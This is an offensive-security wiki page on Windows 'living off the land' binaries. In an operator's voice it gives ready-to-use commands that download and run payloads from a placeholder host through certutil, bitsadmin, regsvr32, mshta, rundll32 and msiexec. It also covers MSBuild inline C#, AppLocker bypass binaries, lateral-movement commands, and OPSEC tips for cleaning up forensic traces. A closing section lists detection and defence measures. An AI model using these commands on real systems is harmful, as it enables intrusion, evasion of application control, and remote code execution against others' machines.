---
title: Living off the land (LOLBAS/LOLBins)
slug: living-off-the-land
---

> **TL;DR:** Use signed Microsoft binaries already on the box (certutil, msiexec, regsvr32, mshta, rundll32) to download, decode, and execute — your tooling has the same code-signing trust as Windows itself.

## What it is
LOLBAS (Living Off The Land Binaries And Scripts) is the catalogue of signed system binaries with side-effects beyond their nominal purpose — download files, execute code, bypass application control, persist. Using them reduces your footprint to "no new EXE on disk" and inherits Microsoft's signature trust at the AppLocker / WDAC / SmartScreen layer.

## Preconditions / where it applies
- Execution context that can invoke command-line binaries (cmd, PowerShell, WMI, scheduled task)
- AppLocker / WDAC in "audit" mode or rules that allow Microsoft-signed binaries by default (the common case)
- Outbound network access (for downloader LOLBins) or a local file payload

## Technique
**Downloaders.** `certutil`, `bitsadmin`, `curl`, `findstr` (via SMB), MSI URLs.

```
certutil -urlcache -split -f https://host.tld/p.txt %TEMP%\p.bin
bitsadmin /transfer j /priority high https://host.tld/p.exe %TEMP%\p.exe
```

**Execution.** Each of these executes shellcode/script content under the signed binary's identity:

```
regsvr32 /s /n /u /i:https://host.tld/file.sct scrobj.dll
mshta vbscript:Execute("CreateObject(""WScript.Shell"").Run(""calc"")(window.close)")
rundll32 javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject('WScript.Shell').Run('calc')
msiexec /q /i https://host.tld/payload.msi
```

**In-memory .NET.** `InstallUtil` and `regasm` load .NET assemblies. `MSBuild.exe` executes inline XML tasks containing C#:

```
MSBuild.exe payload.xml   # XML with Microsoft.Build.Utilities.Task inline C#
```

**AppLocker bypass classics.** `InstallUtil`, `regasm`, `regsvcs`, `MSBuild`, `presentationhost`, `wmic XSL`, `Jsc.exe` (JScript compiler shipped with .NET), `xwizard` (registers COM objects from arbitrary CLSID config).

**Lateral movement LOLBins.** `wmic process call create`, `sc \\target create`, `schtasks /s`, `psexec` (third-party but on every admin's box), `winrs`.

OPSEC notes: `certutil -urlcache` writes to user temp and to certutil's URL cache — both forensic artefacts. `bitsadmin` jobs persist until completed; use `/complete` to clean up. `mshta` from Office is a top-N detection rule everywhere now.

## Detection and defence
- Process-tree anomalies: Office → mshta → cmd → powershell — most EDRs alert on this exact chain
- Command-line argument analytics: `certutil -urlcache -f` outside of legitimate enterprise PKI workflows
- ASR (Attack Surface Reduction) rules: block Office child processes, block Win32 API from VBA, block executable content from email
- WDAC with strict allowlist of binaries reduces LOLBAS to those Microsoft considers essential — many are no longer required
- AppLocker enforcement of `Script` rules + Constrained Language Mode shuts most downloader/executor LOLBins

## References
- [LOLBAS project](https://lolbas-project.github.io/) — canonical catalogue
- [Microsoft — recommended block rules for WDAC](https://learn.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules) — the binaries Microsoft itself recommends blocking
- [GTFOBins](https://gtfobins.github.io/) — the Linux equivalent
- [[dll-side-loading]] [[opsec-fundamentals]]
